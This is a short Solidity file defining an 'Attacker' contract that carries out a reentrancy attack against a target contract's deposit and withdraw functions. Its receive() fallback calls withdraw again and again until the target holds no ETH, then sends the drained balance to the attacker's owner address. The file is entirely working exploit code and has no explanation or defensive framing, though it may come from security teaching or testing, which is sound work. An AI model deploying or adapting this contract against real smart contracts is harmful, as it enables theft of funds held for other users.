// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableUpgradeableContract {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableUpgradeableContract public vulnerableContract;
    address payable owner;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableUpgradeableContract(_vulnerableContract);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.value > 0, "Must send ETH to attack");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw();
    }

    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        } else {
            (bool success, ) = owner.call{value: address(this).balance}("");
            require(success, "Withdraw failed");
        }
    }

    function getContractBalance() external view returns (uint256) {
        return address(vulnerableContract).balance;
    }
}
